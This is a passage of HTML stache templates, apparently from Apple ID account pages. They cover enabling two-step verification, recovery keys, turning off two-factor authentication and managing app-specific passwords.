                                    {{/if}}
                                </div>
                            </div>
                            <div class="detail clearfix">
                                This can be your own number, or the number of someone you trust.
                            </div>
                        </div>
                    </div>
                    <div class="flow-footer modal-footer clearfix">
                        <div class="btn-group flow-controls pull-right">
                            <loading loading="{phoneLoading}"></loading>
                            <button type="button" class="btn btn-link first cancel">Cancel</button>
                            <button type="button" class="btn btn-link last add-phone"{{^enablePhone}} disabled{{/if}}><span class="mobile-only">Next</span><span class="not-mobile">Continue</span></button>
                        </div>
                    </div>
                {{/is}}
                {{#is step "3"}}
                    <div class="modal-header">
                        <h4 class="modal-title">Verify Phone Number</h4>
                        <div class="mobile-only section-title">
                            <h2 class="wrap-popover-title">
                               Security
                            </h2>
                        </div>
                    </div>
                    <div class="modal-body step3">
                        <div class="container-xs intro">
                            <div class="text-sent">A text message with a verification code has been sent to <span class="semibold nowrap force-ltr">{{device.name}}</span>.</div> Enter the code here:
                        </div>

                        <div class="action-wrapper">
                            <div class="pop-wrapper field-pop-wrapper verify-set clearfix">
                                <div class="code-wrapper clearfix">
                                    <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="{blurOnComplete}" type="tel" localisedigit="Digit"></security-code>
                                </div>
                                {{#if errors.code.hasErrors}}
                                    <div class="errorPop-body popover" role="tooltip" style="display: none">
                                        <div id="arrow" class="errorPop-arrow arrow"></div>
                                        <div class="errorPop-content popover-content">
                                            {{errors.code.main.message}}
                                        </div>
                                    </div>
                                {{/if}}
                            </div>
                            <div class="detail">
                                <button class="btn btn-link didnt-receive" data-toggle="tooltip" data-placement="auto" title="SMS messages may be delayed depending on your mobile operators coverage and other service interruptions.">
                                    Did not get a verification code?
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="flow-footer modal-footer clearfix">
                        <div class="pull-left">
                            <button class="btn btn-link resend">
                                {{^if resendLoading}}
                                    <i class="icon icon_reload"></i> Send a new code
                                {{else}}
                                    <loading loading="{resendLoading}"></loading> 
                                    Sending Code
                                {{/resendLoading}}
                            </button>
                        </div>
                        <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                            <loading loading="{verifyLoading}"></loading>
                            <button type="button" role="button" class="btn btn-link first cancel">Cancel</button>
                            <button type="button" role="button" class="btn btn-link last verify-code"{{^didReachMaxLength}} disabled{{/if}}><span class="mobile-only">Next</span><span class="not-mobile">Verify</span></button>
                        </div>
                    </div>
                {{/is}}
                {{#is step "verifyDevices-select"}}
                <div class="modal-header">
                    <h4 class="modal-title">Verify Trusted Devices</h4>
                    <div class="mobile-only section-title">
                        <h2 class="wrap-popover-title">
                            Security
                        </h2>
                    </div>
                </div>
                <div class="modal-body">
                    <div class="intro-title mobile-only">Verify Devices</div>
                    <div class="intro">
                        You can also receive verification codes using any device that has Find My iPhone, iPad or iPod touch enabled. Verify each of the devices below.
                    </div>
                    <div class="action-wrapper">
                        {{#if verifyDevices.length}}
                            {{#each verifyDevices}}
                            <div class='row device-row{{^is liveStatus "online"}} offline{{/is}}'>
                                <div class="col-xs-10">
                                    <div class="device-img"><img src="{{imageLocation2x}}" alt="{{#modelName}}{{modelName}}{{/modelName}}{{^modelName}}{{typeName}}{{/modelName}}" class="img" /></div>
                                    <div class="device-name">{{name}} </div>
                                    <div class="device-description">{{#modelName}}{{modelName}}{{/modelName}}{{^modelName}}{{typeName}}{{/modelName}}
                                        {{^is liveStatus "online"}}
                                        <span class="pin-tip" data-toggle="popover" data-placement="right" data-content="To use this device, make sure it is connected to the Internet. If you no longer have this device, you can go to the Devices section and remove it.">
                                            (Offline)
                                        </span>
                                        {{/is}}
                                    </div>
                                </div>
                                <div class="col-xs-2 action-row">
                                    {{#unless trusted}}
                                        <button class='btn btn-link enroll-verify-device {{^is liveStatus "online"}}disabled{{/is}}' data-deviceName="{{name}}" data-deviceId="{{id}}" {{^is liveStatus "online"}}disabled="disabled"{{/is}}> Verify </button>
                                    {{else}}
                                        <span class="enroll-device-verified">Verified</span>
                                    {{/unless}}
                                </div>
                            </div>
                            {{/each}}
                        {{else}}
                        <div class="devices-empty">
                            No devices available
                        </div>
                        {{/if}}
                    </div>
                    <div class="row device-actions">
                        <div class="col-xs-12 col-sm-12 refresh-devices">
                            {{#unless loadingTrustedDevices}}
                            <span class="nowrap"><span class="nowrap">Do not see a device? </span><button class="btn btn-link btn-text-link refresh-devices nowrap" role="button">Refresh Devices</button> or <a href="http://support.apple.com/kb/PH2697" target="_blank"class="btn btn-link btn-text-link nowrap">Set up Find My iPhone.</a></span>
                            {{else}}
                            <loading loading="{loadingTrustedDevices}"></loading><span>Refreshing...</span>
                            {{/unless}}
                        </div>
                    </div>
                </div>
                <div class="flow-footer modal-footer clearfix">
                    {{#unless enroll.continueEnabled}}
                    <div class="btn-group flow-controls pull-left learn-more enroll">
                        <button type="button" role="button" class="btn btn-link skip-verify-devices">Skip This Step</button>
                    </div>
                    {{/unless}}
                    <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                        <loading loading="{verifyLoading}"></loading>
                        <button type="button" role="button" class="btn btn-link first cancel">Cancel</button>
                        <button type="button" role="button" class="btn btn-link last continue-verify-devices"{{^enroll.continueEnabled}} disabled{{/if}}><span class="mobile-only">Next</span><span class="not-mobile">Continue</span></button>
                    </div>
                </div>
                {{/is}}
                {{#is step "verifyDevices-verify"}}
                <div class="modal-header">
                    <h4 class="modal-title">Verify {{enroll.deviceName}}</h4>
                    <div class="mobile-only section-title">
                        <h2 class="wrap-popover-title">
                            Security
                        </h2>
                    </div>
                </div>
                <div class="modal-body stepEnrollVerify">
                    <div class="container-xs intro">
                        A verification code has been sent to <span class="semi-bold">{{enroll.deviceName}}</span>.<br />Enter the code here:
                    </div>
                    <div class="action-wrapper">
                        <div class="pop-wrapper field-pop-wrapper verify-set clearfix">
                            <div class="code-wrapper">
                                <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="{blurOnComplete}" type="tel" localisedigit="Digit"></security-code>
                            </div>
                            {{#if errors.code.hasErrors}}
                            <div class="errorPop-body popover" role="tooltip" style="display: none;">
                                <div class="errorPop-arrow arrow"></div>
                                <div class="errorPop-content popover-content">
                                    {{errors.code.main.message}}
                                </div>
                            </div>
                            {{/if}}
                        </div>
                        <div class="detail">
                            
                            <button class="btn btn-link didnt-receive" data-toggle="tooltip" data-placement="auto" title="Click Send a new code to try again if you did not receive a text message.">
                                Did not get a verification code?
                            </button>
                        </div>
                    </div>
                </div>
                <div class="flow-footer modal-footer clearfix">
                    <div class="pull-left">
                        <button type="button" role="button" class="btn btn-link enroll-verify-resend">
                            {{^if resendLoading}}
                            <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                            <loading loading="{resendLoading}"></loading> 
                            Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                    <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                        <loading loading="{verifyLoading}"></loading>
                        <button type="button" role="button" class="btn btn-link first enroll-verify-go-back">Go Back</button>
                        <button type="button" role="button" class="btn btn-link last enroll-verify-code"{{^didReachMaxLength}} disabled{{/if}}><span class="mobile-only">Next</span><span class="not-mobile">Verify</span></button>
                    </div>
                </div>
                {{/is}}
                {{#is step "4"}}
                    {{#if getRecovery}}
                        <div class="modal-header">
                            <h4 class="modal-title">Print Your Recovery Key</h4>
                            <div class="mobile-only section-title">
                                <h2 class="wrap-popover-title">
                                    Security
                                </h2>
                            </div>
                        </div>
                        <div class="modal-body">
                            <div class="intro-title mobile-only">
                                Get Recovery Key
                            </div>
                            <div class="intro">
                                You will need your Recovery Key to access your account if you ever forget your password or lose your trusted devices.
                            </div>
                            <div class="rk">
                                <p class="rk-copy">Recovery Key:</p>
                                <div class="rk-wrapper noselect">
                                    <div class="rk-key-icon">
                                        <img src="https://appleid.cdn-apple.com/static/bin/cb773547687/images/key.png" height="26" alt="" width="26" class="key-image" />
                                    </div>
                                    <div class="user-key noselect force-ltr"><span class="bold">RK</span>-<span class="dictate">{{displayRK}}</span></div>
                                </div>
                            </div>
                            <div class="intro">
                                Print or write down your Recovery Key.
                                Keep at least one copy in a safe place.
                                <div class="dont-save">
                                    Do not save it on your computer.
                                </div>

                            </div>
                            <div class="intro">
                                <a href="https://support.apple.com/HT204152#store_recovery_key" target="_blank" title='Where should I keep my Recovery Key?'>
                                Where should I keep my Recovery Key?
                                </a>
                            </div>
                        </div>
                    {{else}}
                        <div class="modal-header">
                            <h4 class="modal-title">Confirm Recovery Key</h4>
                            <div class="mobile-only section-title">
                                <h2 class="wrap-popover-title">
                                    Security
                                </h2>
                            </div>
                        </div>
                        <div class="modal-body confirm-rk">
                            <div class="intro-title mobile-only">Confirm Recovery Key</div>
                            <div class="intro">
                                <div>
                                    Enter your Recovery Key below to confirm that you have a copy.
                                </div>
                            </div>
                            <div class="rk-input-group">
                                <div class="text-center">
                                    <label for="rkInput" class="rk-input-label">Recovery Key:</label>
                                </div>
                                <div class="rk-input-wrapper clearfix">
                                    <div class="rk-key-icon">
                                        <img src="https://appleid.cdn-apple.com/static/bin/cb773547687/images/key.png" height="26" alt="" width="26" class="key-image" />
                                    </div>
                                    <recovery-key recovery-key="{userRecoveryKey}" max-length="{{recoveryKeyInputLength}}" classes="{{#if rkNotMatching}}has-errors{{/if}}"></recovery-key>
                                    {{#rkMatchSuccess}}<i class="icon icon_green_check icon_check rk-match icon-adjust"></i>{{/if}}
                                    {{#rkNotMatching}}
                                        <div class="errorPop-body popover" role="tooltip" style="display: none;">
                                            <div id="arrow" class="errorPop-arrow arrow"></div>
                                            <div class="errorPop-content popover-content">
                                                Invalid Recovery Key
                                            </div>
                                        </div>
                                    {{/rkNotMatching}}
                                </div>

                                <div class="intro">
                                    <a href="https://support.apple.com/HT204152#store_recovery_key" target="_blank" title='Where should I keep my Recovery Key?'>
                                    Where should I keep my Recovery Key?
                                    </a>
                                </div>
                            </div>
                        </div>
                    {{/if}}
                    <div class="flow-footer modal-footer clearfix">
                        {{#getRecovery}}
                            <div class="btn-group flow-controls pull-left not-mobile">
                                <button type="button" class="btn btn-link print-rk">
                                    Print Recovery Key
                                </button>
                            </div>
                        {{/if}}
                        <div class="btn-group flow-controls pull-right">
                            <loading loading="{recoveryLoading}"></loading>
                            {{#getRecovery}}
                                <button type="button" class="btn btn-link first cancel">Cancel</button>
                                <button type="button" class="btn btn-link last got-rk not-mobile">Continue</button>
                                <button type="button" class="btn btn-link last got-rk mobile-only">Next</button>
                            {{else}}
                                <button type="button" class="btn btn-link not-mobile first go-back-rk">Go Back</button>
                                <button type="button" class="btn btn-link mobile-only first go-back-rk">Back</button>
                                <button type="button" class="btn btn-link last confirm"{{^rkDidReachMinLength}} disabled{{/if}}>
                                    <span class="mobile-only">Next</span><span class="not-mobile">Confirm</span>
                                </button>
                            {{/if}}
                        </div>
                    </div>
                {{/is}}
                {{#is step "4-5"}}
                    <div class="modal-header">
                        <h4 class="modal-title">Enable Two-Step Verification</h4>
                        <div class="mobile-only section-title">
                            <h2 class="wrap-popover-title">
                                Security
                            </h2>
                        </div>
                    </div>
                    <div class="modal-body step4-5">
                        <div class="intro-title mobile-only">Enable Two-Step Verification</div>
                        <div class="intro">
                            Before you can enable two-step verification, you must agree to the following conditions:
                        </div>
                        <div class="well">
                            <div class="intro">When Two-Step Verification is enabled:</div>
                            <div class="list-wrapper">
                                <ul class="list">
                                    <li class="list-item">
                                        You will always need two of the following to manage your Apple ID: your password, a trusted device or your Recovery Key.
                                    </li>
                                    <li class="list-item">
                                        If you forget your password, you will need your Recovery Key and a trusted device to reset it. Apple will not be able to reset your password on your behalf.
                                    </li>
                                    <li class="list-item">
                                        <a href="https://support.apple.com/en-us/HT204397" target="_blank">App-specific passwords</a> will be required to sign in to any apps and services not provided by Apple.
                                    </li>
                                    <li class="list-item">
                                        You are responsible for storing your Recovery Key in a safe place.
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="intro">
                            <div class="checkbox">
                                <input type="checkbox" id="agree-2sv" name="agree-2sv" can-field="{hasAcceptedConditions}"/>
                                <label for="agree-2sv">I understand the conditions above.</label>
                            </div>
                        </div>
                    </div>
                    <div class="flow-footer modal-footer clearfix">
                        <div class="btn-group flow-controls pull-right">
                            <loading loading="{recoveryLoading}"></loading>
                            <button type="button" class="btn btn-link first cancel">Cancel</button>
                            <button type="button" class="btn btn-link last enable"{{^hasAcceptedConditions}} disabled{{/if}}>
                                <span class="mobile-only">Next</span><span class="not-mobile">Enable Two-Step Verification</span>
                            </button>
                        </div>
                    </div>
                {{/is}}
                {{#is step "5"}}
                <div class="modal-header mobile-only">
                    <div class="section-title">
                        <h2 class="wrap-popover-title">
                            Security
                        </h2>
                    </div>
                </div>
                <div class="modal-body">
                    <div class="icon icon_green_check lg_check not-mobile"></div>
                    <div class="intro-title mobile-only">Two-Step Verification Enabled</div>
                    <div class="intro mobile-only">
                        You can now add more trusted devices to your account to verify your identity.
                    </div>
                    <div class="intro not-mobile">
                        Two-Step Verification Enabled
                    </div>
                    <div class="btn-group flow-controls mobile-only">
                        <button class="btn btn-link last done">Go Back to Security Settings</button>
                    </div>
                </div>
                <div class="flow-footer modal-footer done-footer clearfix not-mobile">
                    <div class="btn-group flow-controls pull-right">
                        <button class="btn btn-link last done">Done</button>
                    </div>
                </div>
                {{/is}}
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_872116253">


<div class="modal fade flow-dialog default-dialog embargo-dialog" id="twoStepEnrollEmbargoModal" data-backdrop="static">
        <div class="modal-dialog">
            <div class="modal-content" role="dialog" aria-labelledby="embargoWaitTitle" tabindex="-1">
                <div class="modal-body embargo-body">
                    <div class="row">
                        <div class="col-sm-2 not-mobile">
                            
                            <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                        </div>
                        <div class="col-sm-10 exclude-padding modal-wrapper">
                            <div class="modal-header content">
                                <h4 class="modal-title" id="embargoWaitTitle">You must wait {{embargoPeriod.timePeriod}} {{embargoPeriod.timeUnits}} before enabling two-step verification.</h4>
                            </div>
                            <div class="modal-body-content">
                                <p class="body-text">For security reasons, you cannot set up two-step verification immediately after significant changes have been made to your account. This helps ensure that only the owner of this Apple ID can set up two-step verification. </p>
                                <p class="body-text content">A notification email will be sent to all addresses on file for your account.</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <button type="button" class="btn btn-link last done-embargo" data-dismiss="modal">Done</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</script>
<script type="text/stache" id="jstache_624532933">


<div class="modal flow-dialog default-dialog wait-for-two-step-verification-modal" id="waitForTwoStepVerificationModal"
     role="dialog" aria-labelledby="waitForTwoStepVerificationModalTitle" tabindex="0" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" height="64" alt="Warning" width="64" />
                    </div>
                    <div class="col-sm-10 exclude-padding content">
                        <div class="modal-header">
                            <h4 class="modal-title" id="errorWarningModalTitle">
                                You must wait to enable two-step verification.
                            </h4>
                        </div>
                        <div class="modal-body-content exclude-padding">
                            <p class="body-text">For security reasons, two-step verfication is temporarily unavailable. Try again later.</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="modal-footer">
                <div class="flow-controls pull-right">
                    <button type="button" class="btn btn-link last continue" data-dismiss="modal">OK</button>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1592209350">


<div class="step step{{step}} flow-unenroll">
    <div class="popover-body">
        {{#is step "0"}}
            <div class="intro">
                <label class="multifield-label">
                    {{#is account.type "hsa2"}}
                        Turn Off Two-Factor Authentication?
                    {{/if}}
                    {{#is account.type "hsa1"}}
                        Turn off two-step verification?
                    {{/if}}
                </label>
                <div class="detail">
                    {{#is account.type "hsa2"}}
                        If you turn off two-factor authentication, your account will be protected with only your password and security questions.
                    {{/if}}
                    {{#is account.type "hsa1"}}
                        Turning off two-step verification will make your account less secure. Are you sure you want to proceed?
                    {{/if}}
                </div>
            </div>

            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last intro-continue">
                        <span class="mobile-only">
                            Continue
                        </span>
                        <span class="not-mobile">
                            {{#is account.type "hsa2"}}
                                Turn Off Two-Factor Authentication
                            {{/is}}
                            {{#is account.type "hsa1"}}
                                Turn Off Two-Step Verification
                            {{/is}}
                        </span>
                    </button>
                </div>
            </div>
        {{/is}}
        {{#is step "1"}}
            <div class="intro not-mobile">
                Select new security questions and answers:
            </div>
            <div class="intro questions-intro mobile-only">
                Select security questions and answers:
            </div>
            <changequestionsaction account="{account}" errors="{validationErrors}" config="{config}" user-set="{userSet}" qa-model="{qaModel}" complete="{questionsComplete}"></changequestionsaction>
            <div class="details about-questions">
                These security questions will help us to verify your identity when you need to access your account or reset your password.
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{questionsLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last specific"{{^questionsComplete}} disabled{{/if}}>Continue</button>
                </div>
            </div>
        {{/is}}

        {{#is step "2"}}
            <div class="intro">
                <label class="multifield-label">
                    {{#is account.type "hsa2"}}
                        Confirm your date of birth:
                    {{/is}}
                    {{#is account.type "hsa1"}}
                        Enter your date of birth:
                    {{/is}}
                </label>
            </div>

            <div class="details">
                <div class="pop-wrapper field-pop-wrapper">
                    <div class="dob-wrapper clearfix">
                        <date focus-placeholder="{{config.localizedResources.dateInputPlaceholder}}"
                              format="{{config.localizedResources.dateInputFormat}}"
                              classes="form-control form-input field{{#if errors.birthday.hasErrors}} has-errors{{/if}}"
                              input-date="{birthday}"
                              placeholder="date of birth"
                              errors="{errors.birthday}"></date>
                        {{#if errors.birthday.showError}}
                            <div class="errorPop-body popover" role="tooltip">
                                <div class="errorPop-arrow arrow"></div>
                                <div class="errorPop-content popover-content">
                                    {{#if underAge}}
                                        If you are under {{ageMin}}, you must be part of a family. <a href="http://support.apple.com/HT201084" target="_blank">Learn more...</a>
                                    {{/if}}
                                    {{#if futureDOB}}
                                        Your date of birth must be in the past.
                                    {{/if}}
                                    {{#if invalidDOB}}
                                        Enter a valid date of birth.
                                    {{/if}}
                                </div>
                            </div>
                        {{/if}}
                    </div>
                </div>
            </div>

            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{birthdayLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last change-birthday"{{#errors.birthday.hasErrors}} disabled{{/if}}>Continue</button>
                </div>
            </div>
        {{/is}}

        {{#is step "3"}}
            <div class="intro">
                <label class="multifield-label">
                    {{#account.security.rescueEmail}}
                        Confirm your rescue email. A verified rescue email will allow you to reset your password and security questions if you ever forget them.
                    {{else}}
                        Enter a rescue email. A verified rescue email will allow you to reset your password and security questions if you ever forget them.
                    {{/if}}
                </label>
            </div>
            <div class="pop-wrapper field-pop-wrapper">
                <input class="form-control form-input notification-email{{#errors.email.hasErrors}} error has-errors{{/if}}" placeholder="optional" value="{{prospectiveRescueEmail}}" can-value="{prospectiveRescueEmail}" />
                {{#if errors.email.hasErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div id="arrow" class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{errors.email.main.message}}
                        </div>
                    </div>
                {{/if}}
            </div>
        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                <loading loading="{unenrollLoading}"></loading>
                <button type="button" class="btn btn-link first cancel">Cancel</button>
                <button type="button" class="btn btn-link last verify">Continue</button>
            </div>
        </div>
        {{/is}}
        {{#is step "4"}}
        <div class="intro">
            <label class="multifield-label">
                Two-factor authentication has been turned off.
            </label>
            <div class="detail">
                From now on, you will need your date of birth and security questions to verify your identity.
            </div>
        </div>
        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                <button type="button" class="btn btn-link last done">Done</button>
            </div>
        </div>
        {{/is}}
    </div> <!--End popover-body-->
</div>

</script>
<script type="text/stache" id="jstache_187949744">


<div class="appPassword">
    <div class="step1 {{#is step 1}} shown {{else}} hidden {{/if}}">
        <div class="popover-body">
            <div class="row">
                <div class="col-sm-12 exclude-padding {{showError passLabel.errors 'hasErrors'}}">
                    <div class="details">
                        <label for="appPwName"> Enter a label for this password:</label>
                        <div class="pop-wrapper field-pop-wrapper">
                            <input id="appPwName" class="form-control{{#errors.appPw.hasErrors}} error has-errors{{/if}}" placeholder="eg Bill Pay" can-value="passwordLabel" autocomplete="off" maxlength="{{maxlength}}" />
                            {{#if errors.appPw.showErrors}}
                                <div class="errorPop-body popover" role="tooltip">
                                    <div class="errorPop-arrow arrow"></div>
                                    <div class="errorPop-content popover-content">
                                        {{#errors.appPw.map.tooMany}}
                                            You cannot create any more app-specific passwords. To create a new one, delete one of the existing passwords.
                                        {{else}}
                                            {{errors.appPw.main.message}}
                                        {{/if}}
                                    </div>
                                </div>
                            {{/if}}
                        </div>
                    </div>
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{loadingCreatePw}"></loading>
                    <button type="button" class="btn btn-link first cancel"> Cancel</button>
                    <button type="button" class="btn btn-link last generate"{{#errors.appPw.hasErrors}} disabled{{/if}}{{#generateDisabled}} disabled{{/if}} {{#loadingCreatePw}} disabled{{/if}}> Create </button>
                </div>
            </div>
        </div>
    </div>

    <div class="step2 {{#is step 2}} shown {{else}} hidden {{/if}}">
        <div class="popover-body">
            <div class="details">
                <label for="passwordText">  Your app-specific password is:</label>
                <input type="text" id="passwordText" class="form-control password-text" can-value="passwordText" readonly>
                <div class="notes">
                    Enter this password into the password field of the app you would like to sign in to. Password is case-sensitive.
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last done"> Done</button>
                </div>
            </div>
         </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1281877674">


<div class="appPasswordHistory">
    <div class="mobile-only">
        <idms-toolbar cancel-button-text='Back'
                                 section-title='Security'
                     (cancelClicked)="backToSecurity">
        </idms-toolbar>
   
        
    </div>
    <div class="step0 {{#is step 0}} shown {{else}} hidden {{/if}}">
      {{#if loadingPasswords}}
      <div class="row">
       <div class="details">
        <spinner class="spinner-wrapper mobile-only" anchor-element=".app-passwords-loading" show="{loadingPasswords}"></spinner>
        <loading class="app-passwords-spinner not-mobile" loading="{loadingPasswords}"></loading>
        <div class="app-passwords-loading">
        <span>Loading App-Specific passwords...</span>
        </div>
      </div>
      </div>
        <div class="row">
        <div class="not-mobile aid-footer idms-popover-modal-footer app-pass-footer clearfix">
           
                   <div class="btn-group pull-right">
                       <button type="button" class="btn btn-link last done not-mobile">Done</button>
                   </div>
        </div>
        </div>
      {{/if}}
    </div>

    {{#unless loadingPasswords}}
    <div class="step1 {{#is step 1}} shown {{else}} hidden {{/if}}">
            
        <div class="idms-mobile-modal-full-page-body">
        <div class="row">
            <div class="col-sm-12 form-group {{showError passLabel.errors 'hasErrors'}}">
                <div class="details-title">
                    {{#if singular}}
                        You have {{passwords.length}} app-specific password:
                    {{else}}
                        You have {{passwords.length}} app-specific passwords:
                     {{/if}}
                </div>
                <div class="app-passwords">
                        {{#if passwords}}
                           {{#each passwords}}
                           <div class="not-mobile clearfix">
                              <div class="password">
                                  <span class="pass-date">
                                    {{formatDate createDatetime "" config}} - {{formatDate createDatetime "hh:mm A" config}}
                                  </span>
                                  <dl class="dl inline-dl clearfix">
                                      <dt class="dt info-dt pass-desc">
                                          {{description}}
                                      </dt>
                                      <dd class="dd action-dd">
                                          <button class="btn btn-link btn-icon btn-remove" data-id="{{id}}" data-desc="{{description}}" data-createDate="{{createDatetime}}">
                                          <i class="icon icon_remove"></i><span class="sr-only">Delete</span>
                                          </button>
                                      </dd>
                                  </dl>
                              </div>
                            </div>

                            <div class="mobile-only clearfix">

                               <div class="password">
                                   <dl class="dl clearfix">
                                        <dt class="pass-desc">
                                           {{description}}
                                        </dt>
                                        <dd class="pass-date">
                                             <span>
                                             {{formatDate createDatetime "" config}} - {{formatDate createDatetime "hh:mm A" config}}
                                             </span>
                                         </dd>
                                    </dl>
                                    <button class="btn btn-link btn-icon btn-remove-mobile" data-id="{{id}}" data-desc="{{description}}" data-createDate="{{createDatetime}}">
                                     <i class="icon icon_remove"></i><span
                                    class="sr-only">Delete</span>
                                    </button>
                                </div>
                            </div>
                            {{/each}}
                         <button type="button" class="btn btn-link first mobile-only revokeAll-mobile-btn">
                              <span>Revoke All Passwords</span>
                            </button>
                        {{/if}}
                </div>
            </div>
        </div>
        <div class="not-mobile aid-footer idms-popover-modal-footer clearfix">
            <div class="row">
                <div class="col-sm-5 loading-revoke">
                    <div class="verifying {{#if revoking}} shown {{else}} hidden {{/if}}">
                      Revoking... <loading loading="true"></loading>
                    </div>
                </div>
                <div class="col-sm-7 btn-right">
                    <div class="btn-group flow-controls pull-right">
                        <button type="button" class="btn btn-link first revokeAll">
                         <span>Revoke All</span>
                        </button>
                        <button type="button" class="btn btn-link last done not-mobile">Done</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="mobile-only">
        <idms-modal {(show)}="showRevokePassModal">
            <h4 class="idms-popover-modal-title">Revoke "{{selected.description}}?"</h4>

            <div class="details idms-popover-modal-body">
                     You will be signed out of all apps currently using this password until you sign in with a new password.
            </div>

            <div class="popover-footer aid-footer idms-popover-modal-footer clearfix">
              <div class="btn-group flow-controls pull-right">
                <loading loading="{revoking}"></loading>
                <button type="button" class="btn btn-link first cancel-Revoke" >Cancel</button>
                <button type="button" class="btn btn-link last revoke-mobile" {{#if revoking}} disabled {{/if}}> Revoke</button>
              </div>
            </div>

        </idms-modal>


        <idms-modal {(show)}="showRevokeAllModal">
                    <h4 class="idms-popover-modal-title">Revoke All Passwords?</h4>

                    <div class="details idms-popover-modal-body">
                             You will be signed out of all apps currently using this password until you sign in with a new password.
                    </div>

                    <div class="popover-footer aid-footer idms-popover-modal-footer clearfix">
                      <div class="btn-group flow-controls pull-right">
                        <loading loading="{revoking}"></loading>
                        <button type="button" class="btn btn-link first cancel-RevokeAll">Cancel</button>
                        <button type="button" class="btn btn-link last confirmRevokeAll-mobile" {{#if revoking}} disabled {{/if}}> Revoke</button>
                      </div>
                    </div>
        </idms-modal>
        </div>
      </div>
    </div>

    <div class="step2 {{#is step 2}} shown {{else}} hidden {{/if}}">
        <div class="not-mobile">
           <div class="details-title">
                Are you sure you want to revoke this password?
           </div>
           <div class="details">
               You will be signed out of the app currently using this password until you sign in with a new password.
               <div class="app-passwords">
                   <div class="password">
                       <span class="pass-date">
                           {{formatDate selected.createDate "" config}} - {{formatDate selected.createDate "hh:mm A" config}}
                       </span>
                       <span class="pass-desc">
                           {{selected.description}}
                       </span>
                   </div>
               </div>
           </div>
           <div class="not-mobile aid-footer idms-popover-modal-footer clearfix">
               <div class="row">
                   <div class="col-sm-5 loading-revoke">
                       <div class="verifying {{#if revoking}} shown {{else}} hidden {{/if}}">
                         Revoking... <loading loading="true"></loading>
                       </div>
                   </div>
                   <div class="col-sm-7 btn-right">
                       <div class="btn-group flow-controls pull-right">
                           <button type="button" class="btn btn-link first cancel">Cancel</button>
                           <button type="button" class="btn btn-link last revoke" {{#if revoking}} disabled {{/if}}> Revoke</button>
                       </div>
                   </div>
               </div>
           </div>
        </div>
    </div>

    <div class="step3 {{#is step 3}} shown {{else}} hidden {{/if}}">
        <div class="details-title">
            Are you sure you want to revoke all passwords?
        </div>
        <div class="details">
            You will be signed out of all apps currently using this password until you sign in with a new password.
        </div>
        <div class="not-mobile aid-footer idms-popover-modal-footer clearfix">
            <div class="row">
                <div class="col-sm-5 loading-revoke">
                    <div class="verifying {{#if revoking}} shown {{else}} hidden {{/if}}">
                      Revoking... <loading loading="true"></loading>
                    </div>
                </div>
                <div class="col-sm-7 btn-right">
                    <div class="btn-group flow-controls pull-right">
                        <button type="button" class="btn btn-link first cancel"> Cancel </button>
                        <button type="button" class="btn btn-link last confirmRevokeAll" {{#if revoking}} disabled {{/if}}> Revoke </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="step4 {{#is step 4}} shown {{else}} hidden {{/if}}">
        <div class="not-mobile">
        <div class="details-title">
            App-specific passwords successfully revoked.
        </div>
        <div class="details">
            Any apps using app-specific passwords have been signed out.
        </div>
        <div class="not-mobile aid-footer idms-popover-modal-footer clearfix">
            <div class="row">
                <div class="col-sm-5 loading-revoke">
                    <div class="verifying {{#if revoking}} shown {{else}} hidden {{/if}}">
                      Revoking... <loading loading="true"></loading>
                    </div>
                </div>
                <div class="col-sm-7 btn-right">
                    <div class="btn-group flow-controls pull-right">
                        <button type="button" class="btn btn-link last all-done">Done</button>
                    </div>
                </div>
            </div>
        </div>
        </div>
    </div>
    {{/unless}}
</div>
</script>
<script type="text/stache" id="jstache_55814810">


<idms-popover {float-mode}="floatMode" {(show)}="_showPopover" {anchor-element}="anchorElement" {max-width}="maxWidth" {type}="type">
    <content></content>
</idms-popover>
